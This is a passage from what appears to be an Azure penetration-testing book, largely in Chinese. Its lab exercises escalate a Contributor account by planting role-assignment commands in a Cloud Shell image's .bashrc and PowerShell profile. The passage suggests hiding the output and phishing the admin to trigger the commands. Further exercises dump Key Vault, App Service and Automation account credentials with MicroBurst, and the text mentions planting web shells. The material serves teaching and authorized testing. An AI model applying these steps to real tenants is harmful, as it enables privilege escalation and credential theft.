  \n```\nexec_stg_file_download\n```\n\n这会将文件下载到 pentest Linux VM 上的临时目录中。请记下以下截图中突出显示的下载位置：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_244_0.png)\n\n图 6.29 – 使用 Lava 下载的 Cloud\
  \ Shell 文件\n\n9. 下载完成后，使用 exit 命令退出 Lava：\n\n```\nexit\n```\n\n10. 回到 Bash shell，使用以下命令挂载下载的镜像文件。将\
  \ `<download_location>` 替换为本练习步骤 8 中记下的下载路径：\n\n```\nmount <download_location>/.cloudconsole/acc_azureadmin.img\
  \ /mnt\n```\n\n以下是相关截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_244_1.png)\n\
  \n图 6.30 – 在 Linux VM 中挂载 acc_azureadmin.img 文件\n\n11. 键入以下命令并按 Tab 键，浏览已挂载的驱动器：\n\
  \n```\nls /mnt/\n```\n\n您应该会看到 Cloud Shell 用户之前会话中的持久化文件和数据的输出。其中包括敏感信息，例如用户的 shell\
  \ 上下文信息。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_245_0.png)\n\n图 6.31 – 已挂载\
  \ Cloud Shell 文件的目录列表\n\n12. 切换到已挂载的驱动器目录，并输入以下命令，将恶意命令附加到 .bashrc 文件中，以提升当前 Contributor\
  \ 用户的权限：\n\n```\ncd /mnt\n```\n\n```\necho \"az role assignment create --role \\\
  \"Owner\\\" --assignee $(az ad user list --display-name contributoruser | jq '.[]'\
  \ | jq -r '.userPrincipalName')\" >> .bashrc\n```\n\nbashrc 是一个 Bash shell 脚本，在每次以交互方式启动\
  \ shell 会话时都会运行。上述命令将确保目标特权用户下次打开 Cloud Shell 会话时，会执行用于提升 Contributor 用户账户权限的命令。以下是相关截图：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_245_1.png)\n\n图 6.32 – 修改 bashrc 文件\n\
  \n13. 要在 PowerShell 会话中执行相同操作，我们需要先在用户的主目录中创建两个目录。PowerShell 配置文件将存放于此。如果收到目录已存在的错误消息，可以忽略并继续执行下一步：\n\
  \n```\nmkdir .config\n```\n\n```\nmkdir .config/PowerShell\n```\n\n14. 与我们对 .bashrc\
  \ 文件所做的操作类似，我们将通过向 PowerShell 配置文件添加以下命令，使 contributoruser 成为订阅的所有者：\n\n```\necho\
  \ \"New-AzRoleAssignment -UserPrincipalName (Get-AzADUser -StartsWith contributoruser).UserPrincipalName\
  \ -RoleDefinitionName Owner\" >> .config/PowerShell/Microsoft.PowerShell_profile.ps1\n\
  ```\n\n以下是前两个步骤的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_246_0.png)\n\n图\
  \ 6.33 – PowerShell 配置文件修改\n\n15. 使用以下命令从会话中卸载驱动器：\n\n```\ncd ..\numount /mnt\n\
  ```\n\n16. 现在，让我们将驱动器上传回存储帐户，并覆盖现有版本。首先，我们将获取存储帐户的名称并将其存储在变量中。将 `<storage_acct_name>`\
  \ 替换为下载原始 Cloud Shell 文件时所用的存储帐户名称（以 cs 前缀开头）：\n\n```\naz storage account list --query\
  \ [].name -o tsv\nstoragename=<storage_acct_name>\n```\n\n以下是相关截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_246_1.png)\n\
  \n图 6.34 – 识别 Cloud Shell 存储帐户\n\n17. 使用以下命令获取访问密钥和文件共享，并将镜像上传回其中。将 `<download_location>`\
  \ 替换为本练习步骤 8 中记下的位置：\n\n```\nkey=$(az storage account keys list -n $storagename\
  \ --query [0].value -o tsv)\n```\n\n```\ncsfileshare=$(az storage share list --account-key\
  \ $key --account-name $storagename --query [].name -o tsv)\n```\n\n```\naz storage\
  \ file upload --account-key $key --account-name $storagename --share-name $csfileshare\
  \ --path \".cloudconsole/acc_azureadmin.img\" --source \"<download_location>/.cloudconsole/acc_azureadmin.img\"\
  \n```\n\n此后将开始上传过程。这将覆盖共享中的现有文件。以下是相关截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_247_0.png)\n\
  \n图 6.35 – 上传修改后的 .img 文件\n\n18. 最后，我们需要以 azureadmin 用户账户打开一个 Cloud Shell 实例来触发攻击。为此，我们将以\
  \ azureadmin 账户登录，并在门户中打开 Cloud Shell。从以下截图可以看到，我们的命令已在 Cloud Shell 实例中执行，并且我们的\
  \ contributoruser 账户现在已是订阅的所有者：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_248_0.png)\n\
  \n图 6.36 – contributoruser 被添加为所有者\n\n作为攻击者，在这种场景下，我们可能希望行动更隐蔽一些。要隐藏我们在前面截图中看到的输出消息，可以在\
  \ PowerShell 命令末尾使用 `| out-null` 函数来重定向输出。或者，我们可以在 Bash shell 攻击命令末尾使用 `&>/dev/null`。这样可以防止命令执行显示在管理员的\
  \ Cloud Shell 输出中。\n\n> **重要说明**\n>\n> 在实际攻击场景中，受害者的 Cloud Shell 账户可能需要一段时间才会打开新会话。为加快这一过程，您可以发送一封包含指向\
  \ `https://shell.azure.com/` 链接的网络钓鱼邮件。该链接不仅看起来合法，而且一旦加载站点，就会立即启动 Cloud Shell 会话。\n\
  \n19. 现在让我们验证一下是否确实已将权限提升为 Owner 角色。我们可以在 Lava 中运行 priv_show 命令来验证：\n\n```\ncd ~/lava\n\
  python3 lava.py\nexec priv_show\n```\n\n您应该可以看到，由于特权提升攻击成功，该用户现在已被分配为 OWNER 角色：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_249_0.png)\n\n图 6.37 – 使用 Lava 确认已修改的角色\n\
  \n因此，既然我们已经验证攻击成功，现在让我们从 Contributor 用户中移除 OWNER 角色分配，以便仅使用 Contributor 角色完成剩余练习。\n\
  \n20. 在以 azureadmin 用户登录的 Cloud Shell (PowerShell) 环境中，逐行运行以下命令，以移除 Contributor\
  \ 用户的 Owner 角色分配：\n\n```\n$upnsuffix=$(az ad signed-in-user show --query userPrincipalName\
  \ --output tsv | sed 's/.*@//')\n$contributoruser = \"contributoruser@$upnsuffix\"\
  \n$contributoruserid=$(az ad user list --upn $contributoruser --query [].objectId\
  \ -o tsv)\naz role assignment delete --assignee $contributoruserid --role \"Owner\"\
  \n```\n\n这将移除 Contributor 用户的 Owner 角色分配。以下是相关截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_250_0.png)\n\
  \n图 6.38 – 移除 contributoruser 账户的 Owner 角色\n\n21. 使用以下命令移除攻击者植入的特权提升命令：\n\n```powershell\n\
  rm .config/PowerShell/Microsoft.PowerShell_profile.ps1\n```\n\n以下是命令的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_250_1.png)\n\
  \n图 6.39 – 移除恶意命令\n\n22. 要移除 Bash Cloud Shell 的特权提升命令，请运行以下命令，并删除截图中突出显示的最后一行。使用\
  \ Ctrl + S 保存文件。\n\n```bash\ncode .bashrc\n```\n\n\n\n\n\n以下是输出的截图和要删除的行：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_251_0.png)\n\
  \n图 6.40 – 删除 .bashrc 文件的修改\n\n现在我们已经看到了 Cloud Shell 如何被滥用，让我们来看一下如何从 Azure Key\
  \ Vaults 中收集敏感信息。\n\n#### 从 Key Vaults 中掠夺密钥、机密和证书\n\nAzure Key Vault 是在 Azure 平台中管理应用程序机密、密钥和证书的服务（图\
  \ 6.41）。Key Vault 的主要用例是为应用程序开发人员提供一种安全的方式，将其代码在运行时需要使用的敏感信息集中存储，而无需将该信息作为代码的一部分。常见存储在\
  \ Key Vault 中的敏感信息可能是令牌、密码、数据存储连接字符串、API 密钥和其他机密类型。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_251_1.png)\n\
  \n图 6.41 – 应用程序如何访问 Key Vault\n\n正如你所能想象的，像 Key Vault 这样的服务通常是攻击者的热门目标，因为它可能包含可用于在攻击链中横向移动或用于解密加密信息的信息。\n\
  \n对 Key Vault 资源的访问通过两个平面进行控制（图 6.42） – 管理平面，其端点为 `management.azure.com`，以及数据平面，其端点为\
  \ `<vault-name>.vault.azure.com`（图 6.42）。**管理平面**是管理员与之交互以执行管理操作的端点，例如创建和删除 Key\
  \ Vault 实例、检索 Key Vault 属性以及更新访问策略。\n\n**数据平面**是应用程序与之交互以访问存储在保管库中的敏感信息（机密、密钥和证书）的接口。在此平面上可以执行的操作包括读取、添加、删除或修改密钥、机密和证书。\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_252_0.png)\n\n*图 6.42 – 管理平面与数据平面访问*\n\
  \n管理平面和数据平面都使用 **Azure Active Directory（Azure AD）** 进行身份验证，但其授权方式不同。管理平面使用 **Azure\
  \ 基于角色的访问控制（Azure RBAC）** 管理权限，而数据平面使用 Key Vault 访问策略，但也可以使用 Azure RBAC 数据权限（见以下说明）。微软故意采用这种方法，以便组织能够将需要管理级权限的角色与需要访问敏感信息的角色分开。这里的思路是，对管理平面的访问不一定会给予对数据平面的访问。\n\
  \n> **重要说明**\n> 在本书撰写之时，有一个新发布的特性允许使用 Azure RBAC 来控制对数据平面的授权访问。微软新增了九个新的服务级别角色，包括\
  \ Key Vault Administrator、Key Vault Certificates Officer 和 Key Vault Crypto Officer，这些角色授予在数据平面上执行不同级别操作的权限。在你的侦察活动中请记住这些角色。\n\
  \n从攻击角度来看，Contributor 角色默认对 Key Vault 资源的 data plane 没有任何权限。然而，我们可以利用其更新访问策略的权限来提升对数据平面的权限\
  \ – `Microsoft.KeyVault/vaults/accessPolicies/write`。诸如 MicroBurst、PowerZure 和 Lava\
  \ 之类的工具利用此功能来转储 Key Vault 资源中的敏感信息。\n\n在审查密钥保管库时，首先要查看访问策略，看看你的当前用户账户是否对保管库有权限。如果你的用户没有保管库的权限，并且你试图保持隐蔽，你可能需要查看如何使用其他授权的安全主体访问保管库。在许多情况下，这些权限会应用于自动化\
  \ `Run as` 账户（见本章后面）、应用注册和/或托管标识。\n\n以下是使用替代主体访问密钥保管库的一些选项：\n\n- **自动化账户**：创建一个使用\
  \ `Run as` 账户访问密钥保管库的新运行手册。\n- **应用注册**：以应用注册身份进行身份验证并访问密钥保管库。\n- **托管标识**：为该标识生成\
  \ REST API 令牌以访问密钥保管库。\n\n这些选项中的每一个允许你访问保管库的方式都非常不同，但与更改访问策略相比，它们可能是访问保管库更隐蔽的选择。\n\
  \n在下一个动手练习中，我们将使用 MicroBurst 利用 Contributor 角色大规模利用 Key Vault 资源。\n\n5. 提示时，选择 Azure\
  \ 订阅并单击确定：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_255_0.png)\n\n图 6.44 – 选择订阅\n\
  \n6. MicroBurst 然后将枚举所有 Key Vault 资源，添加访问策略以临时授予权限，窃取其中的信息，然后删除添加的访问策略。\n\n```\n\
  PS C:\\Users\\pentestadmin\\MicroBurst> Get-AzPasswords -StorageAccounts N -AutomationAccounts\
  \ N -AppServices N -ACR N -CosmosDB N -ModifyPolicies Y -Verbose | Out-GridView\n\
  VERBOSE: Logged In as contributor@azurepentesting.com\nVERBOSE: Getting List of\
  \ Key Vaults...\nVERBOSE: Starting on the azurepentesting Key Vault\nVERBOSE: Current\
  \ user does not have an access policy entry in the azurepentesting vault, adding\
  \ get/list rights\nVERBOSE: Exporting items from azurepentesting\nVERBOSE: Removing\
  \ current user from the Access Policies for the azurepentesting vault\nVERBOSE:\
  \ Starting on the azptkv2881 Key Vault\nVERBOSE: Current user does not have an access\
  \ policy entry in the azptkv2881 vault, adding get/list rights\nVERBOSE: Exporting\
  \ items from azptkv2881\nVERBOSE: Getting Key value for the disk-encryption-key\
  \ Key\nVERBOSE: Getting Secret value for the db-encryption-key Secret\nVERBOSE:\
  \ Getting Secret value for the SQLAdminPassword Secret\nVERBOSE: Getting Secret\
  \ value for the twitter-api-key Secret\nVERBOSE: Removing current user from the\
  \ Access Policies for the azptkv2881 vault\nVERBOSE: Password Dumping Activities\
  \ Have Completed\n```\n\n图 6.45 – 示例 Get-AzPasswords 输出\n\n以下是窃取信息的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_256_0.png)\n\
  \n图 6.46 – Get-AzPasswords 输出在 gridview 中显示\n\n值得注意的是，一些机密的值中会有其所属资源的信息。例如，数据库或存储账户连接字符串。而其他机密将只是机密信息本身，没有其所属资源或服务的上下文。\n\
  \n一种了解机密被使用位置的方法是审查访问策略。这将允许我们看到哪些应用程序/资源正在使用这些敏感信息。例如，如果一个名为 app1 的托管标识具有读取保管库中机密的访问策略分配，你可能会推断出分配了\
  \ app1 托管标识的资源会使用这些机密。你也可以审查资源的诊断日志（如果已启用并且你的凭据有权读取）以查看 API 调用来自何处。\n\n使用 Azure\
  \ Key Vault 和 Contributor 角色的另一种攻击模式是添加一个访问策略，允许我们在供应链攻击中生成受信任的证书。密钥保管库允许客户与受支持的第三方证书颁发机构集成，例如\
  \ Digicert 和 Globalsign，以简化组织受信任 TLS 证书的签发和管理（图 6.47）：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_256_1.png)\n\
  \n图 6.47 – Key Vault 证书生成流程\n\n请将本章加入书签，因为密钥保管库通常包含在 Azure 环境中提升权限所需的机密。除密钥保管库外，还有\
  \ Azure Web 应用，它们经常包含可用于权限提升和横向移动的凭据（和托管标识）。\n\n#### 利用 Web 应用进行横向移动和提升权限\n\nAzure\
  \ Web 应用通常在订阅中用于托管 Web 应用程序和 API。虽然我们之前提到过滥用托管标识的用法，但我们尚未介绍应用程序通常如何被管理。\n\n应用程序代码可以通过多种不同的方式应用到\
  \ App Service 主机。部署中心可以与多种不同的代码存储库解决方案集成以与 CI/CD 管道同步，或代码可以通过手动部署推送。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_257_0.png)\n\
  \n图 6.48 – App Service 部署中心\n\n\n\n\n\n应用程序代码可以通过使用发布配置文件中存储的凭据手动复制到系统。此配置文件包含以下凭据选项：\n\
  \n- Web Deploy\n- FTP\n- ReadOnly FTP\n- Zip Deploy\n- Database Connection Strings\n\
  \n作为对 App Service 应用程序具有 Contributor 角色的攻击者，我们可以访问此发布配置文件以获取凭据。这可以在 Azure 门户中应用程序的概览选项卡中完成。\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_258_0.png)\n\n图 6.49 – App Service 获取发布配置文件链接\n\
  \n这些配置文件也可以在 PowerShell 中收集，使用 Get-AzWebAppPublishingProfile 函数。由于我们在本章中已经很好地使用了\
  \ Get-AzPasswords，我们将继续我们的练习，展示如何使用它来收集 App Service 应用程序的凭据。\n\n#### 实践练习 – 从 App\
  \ Service 提取凭据\n\n以下是我们将在本次练习中完成的任务：\n\n- 任务 1：使用 MicroBurst 从订阅中提取 App Service\
  \ 凭据\n\n以下是完成此任务的步骤：\n\n1. 使用我们之前配置的 PowerShell 会话，使用 Get-AzPasswords 函数执行 App Service\
  \ 凭据转储：\n\n```\nGet-AzPasswords -AutomationAccounts N -StorageAccounts N -Keys N\
  \ -ACR N -CosmosDB N -Verbose | Out-GridView\n```\n\n2. 在提示选择 Azure 订阅时，选择你的测试 Azure\
  \ 订阅并单击确定：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_259_0.png)\n\n图 6.50 - 选择适当的订阅\n\
  \n3. 在 resulting 输出中，你应该会看到从 App Service 配置中转储的凭据。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_259_1.png)\n\
  \n图 6.51 – MicroBurst App Service 输出\n\n现在我们已经可以访问 app service 发布配置文件，我们将看看这些凭据如何与应用程序一起使用。\n\
  \n#### App Service 中的横向移动、权限提升和持久化\n\n在收集了 App Service 发布配置文件的凭据后，我们有几个选项用于持久化、横向移动和/或提升权限。首先，我们需要查看应用程序文件，以查找可能存储在现有配置文件或应用程序代码中的任何凭据。最简单的方法是通过连接到应用程序关联的\
  \ FTP 服务器。你可以在 Azure 门户中获取 FTP 服务器端点（**App Service → Deployment Center → FTP Credentials**）。你也可以使用\
  \ Azure CLI 通过运行以下命令获取端点：\n\n```\naz webapp deployment list-publishing-profiles\
  \ --name <app-name> --resource-group <group-name> --query \"[? ends_with(profileName,\
  \ 'FTP')].{profileName: profileName, publishUrl: publishUrl}\"\n```\n\n然后你可以使用 FTP\
  \ 客户端连接。如果你没有首选的 FTP 客户端，你始终可以使用 Windows 资源管理器配合 FTP:// 路径。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_260_0.png)\n\
  \n*图 6.52 – App Service 应用程序的示例 FTP 目录*\n\n在这一点上，我们还可以上传一个 web shell，它将允许对应用程序服务器进行持久访问，并且允许我们运行命令为任何附加的管理身份生成令牌。如果你选择这种方式，请确保你使用的是你信任的\
  \ web shell 并对 web shell 进行密码保护，以防止其他攻击者访问你的 shell。\n\n作为 web shell 的替代方案，可以从门户中的\
  \ Console 部分在 App Service 服务器上运行命令。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_261_0.png)\n\
  \n图 6.53 – App Service 控制台界面\n\n此界面很方便，但它确实要求你以 Contributor 身份通过 Azure AD 进行身份验证。因此，如果你丢失了\
  \ Contributor 账户，你可能就无能为力了。\n\n最后，还有一个可用于管理应用程序的替代管理界面。此界面可以在 $APP_NAME.scm.azurewebsites.net\
  \ 子域下找到，而不是主 App Service URL ($APP_NAME.azurewebsites.net)。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_261_1.png)\n\
  \n图 6.54 – App Service Kudu 界面\n\n此界面是 Kudu (https://github.com/projectkudu/kudu)\
  \ 服务，它可以允许多种不同的攻击选项。此界面具有 CMD 和 PowerShell 控制台、文件浏览器以及所有环境设置和变量的导出。\n\n此外，此界面无需通过\
  \ Azure AD 进行身份验证即可使用。通过访问受影响站点上的 https://$APP_NAME.scm.azurewebsites.net/basicauth\
  \ 页面，你只需输入发布配置文件中的凭据即可。这在你需要重新获得对订阅的访问权限时非常方便。\n\n> **重要说明**\n> 虽然我们在本章中涵盖了一些横向移动选项，但其中一位作者之前撰写了一篇博客文章，更深入地介绍了其中一些技术：https://blog.netspi.com/lateral-movement-azure-app-services/。\n\
  \n作为本节的最后说明，我们将提到 App Service 应用程序经常附加有托管身份。由于我们之前已经介绍过使用托管身份提升权限（第 5 章，IaaS 服务上的利用\
  \ Contributor 权限），我们想在此将其作为攻击 App Service 应用程序时需要留意的一个选项。用于本章场景创建的应用程序确实附加了托管身份，虽然我们没有针对它的练习，但你仍然可以使用示例\
  \ App Service 应用练习你的托管身份利用技能。\n\n继续到本章的最后一节，我们将回顾 Automation Accounts 以及如何从中提取凭据。\n\
  \n#### 从 Automation Accounts 提取凭据\n\n与许多云环境相关的一个目标是自动化。这可能像自动化系统配置更改和补丁管理一样简单，也可能像自动轮换\
  \ Web 应用程序上的 SSL 证书并将它们存储在密钥库中一样复杂。\n\n这些操作可以通过在 Automation Account 中的 **runbook**\
  \ 中运行代码来完成。这些 runbook 只是存储在 Automation Account 中的代码块。代码可以用 PowerShell 或 Python（2\
  \ 或 3）编写，并且内置编辑器使将常见的 Azure 管理功能集成到代码中变得非常容易。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_263_0.png)\n\
  \n图 6.55 – runbook 创建选项\n\n可以在 Azure 中自动化的任务有无数种，但这些操作通常需要租户中的安全主体访问权限或外部服务的凭据。在安全主体的情况下，可以将\
  \ Run as 账户添加到 Automation Account。此账户可以在订阅或租户内授予权限，并且 runbook 可以使用该账户代表其采取行动。\n\n\
  此外，Run as 账户可以被授予密钥库上的访问策略权限。这将允许该账户从密钥库中提取它可能需要的任何明文凭据，而不是将凭据存储在自动化账户中，或作为 runbook\
  \ 代码本身中的变量。\n\n> **重要说明**\n> \n> 由于 Automation 账户在环境中频繁用于访问密钥库，MicroBurst 工具包中添加了一个函数，用于使用\
  \ Automation 账户 runbook 自动提取 Key Vault 值。请查看此 NetSPI 博客以更好地了解提取过程以及它如何导致 CVE-2019-0962\
  \ 漏洞的发现：\n> \n> https://www.netspi.com/blog/technical/cloud-penetration-testing/azure-automation-accounts-key-stores/。\n\
  \n就这一点而言，明文凭据可以直接存储在 Automation Account runbook 中作为代码中的变量（不是最佳实践），或作为 Automation\
  \ Accounts 中的凭据对象。这些凭据对象可以通过 runbook 代码中的 cmdlet 检索并转换为可以传递给用于身份验证的函数的变量。需要注意的是，任何有权修改和运行\
  \ Automation Account 中 runbook 的人将能够检索这些凭据。\n\n以下是作者在 Azure 渗透测试期间在 Automation Accounts\
  \ 中看到的存储凭据的一些实际示例：\n\n- 虚拟机的存储本地管理员凭据\n- 全球管理员特权账户的存储凭据\n- 硬编码到 runbook 代码中的域加入凭据\n\
  \n虽然我们不会介绍如何读取 runbook 代码以查找凭据，但我们将展示如何使用 MicroBurst 中的函数提取任何存储的凭据和附加 Run as 账户的身份验证证书。\n\
  \n#### Automation Account 凭据提取概述\n\n在高层次上，以下是我们将如何从 Automation Account 中提取存储的 Automation\
  \ Account 凭据和 Run as 账户证书：\n\n1. 首先，我们需要在账户中创建一个新的 runbook。理想情况下，我们会将其命名为通用名称，例如\
  \ `AzureAutomationTutorials`，以便融入其中。\n2. 此 runbook 将把 Cred-1 凭据项转换为变量，然后将用户名和密码输出到作业输出：\n\
  \   \n   ```powershell\n   $myCredential = Get-AutomationPSCredential -Name 'Cred-1'\n\
  \   $userName = $myCredential.UserName\n   $password = $myCredential.GetNetworkCredential().Password\n\
  \   $userName\n   $password\n   ```\n3. 我们将遵循类似的过程来导出附加的 Automation 账户 Run as 证书：\n\
  \n```powershell\n$RunAsCert = Get-AutomationCertificate -Name 'AzureRunAsCertificate'\n\
  $CertificatePath = Join-Path $env:temp RunAsCertificate.pfx\n```\n\n\n\n\n\n```\n\
  $Cert = $RunAsCert.Export('pfx','CertificatePassword')\nSet-Content -Value $Cert\
  \ -Path $CertificatePath -Force -Encoding Byte | Write-Verbose\n$base64string =\
  \ [Convert]::ToBase64String([IO.File]::ReadAllBytes('$CertificatePath'))\n$base64string\n\
  ```\n\n4. 最后，我们可以查看作业输出以恢复凭据。证书可以从 Base64 字符串转换回 pfx 文件，并且存储的凭据应以明文形式可用。\n\n通过这种方式编写输出，我们可能会无意中将环境凭据暴露给权限较低的用户。为了解决这个问题，Get-AzPasswords\
  \ 函数会生成一个证书用于在传输过程中加密凭据。这可以防止旁观者从输出日志中以明文形式检索凭据。\n\n让我们看看如何使用 MicroBurst 中的 Get-AzPasswords\
  \ 函数来自动化该过程，以便进行下一次动手练习。\n\n#### 动手练习 – 在测试 Automation 账户中创建 Run as 账户\n\n由于 Run\
  \ as 账户跨越了订阅和 Azure AD 的边界，我们无法以编程方式创建并将账户附加到新的 Automation 账户。幸运的是，完成此过程非常简单。以下是本练习中我们将完成的任务：\n\
  \n- Task 1: Create a Run as account for an Azure Automation account.\n\n以下是完成此任务的步骤：\n\
  \n- 1. Log in as the azureadmin account, or as an owner of the subscription.\n-\
  \ 2. Navigate to the Automation Accounts section.\n- 3. Either choose an existing\
  \ Automation account or create a new one.\n  If you're creating a new Automation\
  \ account, a Run as account can be created along with the account.\n- 4. Select\
  \ Run as accounts from the menu blade.\n- 5. Choose **Create Azure Run As Account**\
  \ in the menu.\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_266_0.png)\n\nFigure\
  \ 6.56 – Creating a Run as account\n\n- 6. In the next window, select the **Create**\
  \ button.\n\nThat is all that we need to do! Now we have a Run as service principal\
  \ account to extract from our sample Automation account. By default, this account\
  \ will have the Contributor role applied for the subscription that it is created\
  \ in.\n\n#### 动手练习 – 从 Automation 账户中提取存储的密码和证书\n\n与其它示例类似，Get-AzPasswords 函数使我们能够非常轻松地从\
  \ Automation 账户收集凭据：\n\n- 1. Using our previously configured Contributor account\
  \ for an authenticated PowerShell session, use the Get-AzPasswords function to perform\
  \ a dump of credentials for Automation accounts:\n\n```\n```powershell\nGet-AzPasswords\
  \ -AppServices N -StorageAccounts N -Keys N\n-ACR N -CosmosDB N -Verbose | Out-GridView\n\
  ```\n```\n\n2. When prompted to select an Azure subscription, select your test Azure\
  \ subscription and click OK:\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_267_0.png)\n\
  \nFigure 6.57 – Select the appropriate subscription\n\n3. In the resulting output,\
  \ you should see credentials that were dumped from the Automation account:\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_267_1.png)\n\
  \nFigure 6.58 – Note the cleartext credential\n\n4. Open the current path in File\
  \ Explorer using the following command:\n\n```\nexplorer .\n```\n\n5. Note that\
  \ there are now two new files in the directory where the command was run from:\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_267_2.png)\n\nFigure 6.59 – Note the\
  \ ps1 and pfx files\n\n6. For proof of concept, run the AuthenticateAs-automation-acct-AzureRunAsConnection.ps1\
  \ script to log in as the RunAs account.\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_268_0.png)\n\
  \nFigure 6.60 – Using the exported PowerShell script to authenticate\n\n7. Use the\
  \ following command to confirm the current user context:\n\n```\n(Get-AzContext).Account\n\
  ```\n\nThe following shows a screenshot of the preceding command:\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_268_1.png)\n\
  \nFigure 6.61 – Confirmation of the service principal authentication\n\nWe now have\
  \ the cleartext credentials from the Automation account and a private certificate\
  \ that we can use to authenticate as the Run as account. Since the Contributor role\
  \ is configured for the Run as account by default, this means we will likely have\
  \ a persistent Contributor account in the subscription.\n\n- 3. In the PowerShell\
  \ session within the Cloud Shell pane, run the following commands to download and\
  \ verify the script to remove the resources created for the chapter scenarios:\n\
  \n```\n```powershell\nPS C:\\> Invoke-WebRequest https://bit.ly/contributor-paas-scenarios-cleanup\
  \ -O contributor-paas-scenarios-cleanup.ps1\nPS C:\\> Get-ChildItem\n```\n```\n\n\
  Here is a screenshot of what it looks like:\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_270_0.png)\n\
  \nFigure 6.63 – Results of downloading the script\n\n- 4. Run the downloaded script\
  \ to remove the objects and resources that were created for the exercises in this\
  \ chapter using the following command:\n\n```\n```powershell\nPS C:\\> ./contributor-paas-scenarios-cleanup.ps1\n\
  ```\n```\n\nWait for the script to complete. It may take about eight minutes to\
  \ complete.\n\n```\nPS /home/azureadmin>\nPS /home/azureadmin> ./contributor-paas-scenarios-cleanup.ps1\n\
  Cleanup Started 05/02/2021 18:58:07\n######################################################################\n\
  #### Cleaning up role assignments #\n######################################################################\n\
  ######################################################################\n#### Cleaning\
  \ up identity objects #\n######################################################################\n\
  ######################################################################\n#### Cleaning\
  \ up resource group #\n######################################################################\n\
  Successfully cleaned up resources!!\nPS /home/azureadmin>\n```\n\nFigure 6.64 –\
  \ Results of running the cleanup script\n\nCongratulations! You have completed all\
  \ the exercise scenarios in this chapter and successfully removed the resources\
  \ that were set up from your subscription.\n\n#### Summary\n\nIn this chapter, we\
  \ covered a number of the PaaS services that are commonly used in Azure environments.\
  \ As a key takeaway, remember that these services frequently contain credentials\
  \ that can be used for lateral movement and privilege escalation, so make sure that\
  \ you take the time to review these services during a penetration test. If you are\
  \ in a rush, you can always use Get-AzPasswords for all of the available services\
  \ and hope for the best.\n\nWhile this chapter did not comprehensively cover all\
  \ of the PaaS services, we hopefully covered the main ones that you will run into\
  \ during testing. In the following chapter, we will review the steps that you can\
  \ take as an owner of a subscription and show the ways that you can escalate from\
  \ the Owner role to an Azure AD role.\n"
- "### 7\nExploiting Owner and Privileged Azure AD Role Permissions\n\nIn the first\
  \ chapter of this book, we made a distinction between the Azure AD roles and the\
  \ Azure RBAC roles. We mentioned that Azure AD roles are used to manage access to\
  \ Azure AD resources and operations, such as user accounts or group creation, and\
  \ password resets, while Azure RBAC roles are used to manage access to Azure resources\
  \ such as subscriptions, storage accounts, and SQL databases. For the most part,\
  \ both services have separate scope boundaries. In general, an Azure AD role assignment\
  \ does not grant access to manage Azure resources and an Azure RBAC role assignment\
  \ does not grant access to manage Azure AD resources.\n\nBridging the gap from subscription\
  \ Owner up to the root management group, or an Azure AD administrative role, or\
  \ to on-premises targets, can be a difficult task. Likewise, moving laterally from\
  \ Azure AD to Azure subscription resources could be tricky. In this chapter, we\
  \ will focus on different techniques that can be used to move laterally beyond the\
  \ scope of a user's existing permissions assignment within an environment.\n\n\n\
  \n\n\n以下是我们将要涵盖的主题：\n\n- 从 Azure AD 提升到 Azure RBAC 角色\n- 从订阅所有者提升到 Azure AD 角色\n\
  - 攻击本地系统以在 Azure 中提升权限\n\n#### 技术要求\n\n在本章中，我们将讨论如何使用 BloodHound 工具在 Azure 租户（以及普通\
  \ Active Directory）中查找可被滥用以提升权限的路径。虽然并非绝对需要跟随操作，但这是一个值得拥有的强大工具：\n\n- BloodHound:\
  \ https://github.com/BloodHoundAD/BloodHound\n\n#### 从 Azure AD 提升到 Azure RBAC 角色\n\
  \n如图 7.1 所示，Azure AD 角色分配不会授予管理 Azure 资源的访问权限，而 Azure RBAC 角色分配默认也不会授予管理 Azure AD\
  \ 资源的访问权限：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_274_0.png)\n\n图 7.1 – Azure\
  \ AD 角色与 Azure RBAC 角色\n\n**重要说明**\n即使本章的讨论主要集中在 Azure AD 中的全局管理员角色上，Azure AD 中还有其他内置角色可用于执行此攻击。这包括以下角色：**用户管理员**、**组管理员**和**目录写入者**。此外，任何具有以下权限的\
  \ Azure AD 自定义角色都可能被利用：`microsoft.directory/groups/members/update`。\n\n这是一个非常简单的攻击，我们在\
  \ *第 4 章，滥用 Reader 权限* 的动手练习中已经利用过类似的东西，但略有变化。如果用户已在订阅中拥有权限，很容易识别订阅中任何特权组，但如果我们的\
  \ Active Directory 用户没有任何订阅权限，我们能做什么呢？一种方法是查看 Azure AD 登录日志。\n\nAzure AD 登录日志会自动记录交互式和非交互式登录活动。从攻击角度来看，日志包含大量信息，可以让攻击者了解哪些用户有权访问每个\
